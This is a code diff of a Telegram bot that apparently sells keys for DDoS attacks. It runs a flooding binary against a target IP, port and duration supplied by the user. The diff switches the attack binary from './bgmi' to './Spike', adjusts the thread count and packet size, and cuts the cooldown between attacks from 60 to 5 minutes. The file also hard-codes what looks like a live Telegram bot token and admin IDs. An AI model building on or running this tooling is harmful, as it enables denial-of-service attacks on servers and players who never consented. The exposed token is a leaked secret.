@@ -27,11 +27,11 @@ KEY_PRICES = {
 }
 ADMIN_IDS = [8163493962, 8163493962, 1909392304]
 BOT_TOKEN = "7638678019:AAFo4n52P7JhZpeEbtFA1ZRDhfOcj81XiaM"
-thread_count = 1000
-packet_size = 8
+thread_count = 900
+packet_size = 4
 ADMIN_FILE = 'admin_data.json'
 last_attack_times = {}
-COOLDOWN_MINUTES = 60
+COOLDOWN_MINUTES = 5
 
 def check_cooldown(user_id: int) -> tuple[bool, int]:
     """
@@ -335,7 +335,7 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
         update_last_attack_time(user_id)
 
         # Construct command for dark binary with thread count and packet size
-        command = f"./bgmi {target_ip} {target_port} {duration} {packet_size} {thread_count}"
+        command = f"./Spike {target_ip} {target_port} {duration} {packet_size} {thread_count}"
 
         # Send initial attack message
         bot.send_message(chat_id, 
